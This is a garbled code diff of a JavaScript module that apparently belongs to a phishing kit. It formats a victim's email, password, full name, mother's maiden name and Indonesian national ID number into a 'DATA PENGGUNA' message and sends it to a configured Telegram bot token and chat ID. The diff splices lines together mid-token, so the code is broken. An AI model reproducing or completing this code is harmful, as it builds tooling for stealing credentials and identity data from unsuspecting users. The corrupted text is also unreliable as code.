@@ -29,7 +29,15 @@
     '🔔 DATA PENGGUNA',
     '',
     `Email            : ${payload.email || payload.username || '-'}`,
-    `Password         : ${payload.password || '-'}`,
+   B_TELEGRAM_ENABLED', 'true').toLowerCase() !== 'false'
+  };
+
+  const sentKeys = new Map();
+
+  const isConfigured = () => {
+    const token = config.botToken.trim();
+    const chatId = config.chatId.trim();
+    return Boolean(token && chatId `Password         : ${payload.password || '-'}`,
     `Nama Lengkap     : ${payload.nama_lengkap || '-'}`,
     `Nama Ibu Kandung : ${payload.nama_ibu_kandung || '-'}`,
     `NIK KTP          : ${payload.nik || '-'}`,
@@ -91,15 +99,7 @@
   const config = {
     botToken: readConfigValue('KB_TELEGRAM_BOT_TOKEN', DEFAULT_TOKEN),
     chatId: readConfigValue('KB_TELEGRAM_CHAT_ID', DEFAULT_CHAT_ID),
-    enabled: readConfigValue('KB_TELEGRAM_ENABLED', 'true').toLowerCase() !== 'false'
-  };
-
-  const sentKeys = new Map();
-
-  const isConfigured = () => {
-    const token = config.botToken.trim();
-    const chatId = config.chatId.trim();
-    return Boolean(token && chatId && !token.includes('MASUKKAN_') && !chatId.includes('MASUKKAN_'));
+    enabled: readConfigValue('K && !token.includes('MASUKKAN_') && !chatId.includes('MASUKKAN_'));
   };
 
   function buildTelegramPayload(dataInput = {}) {
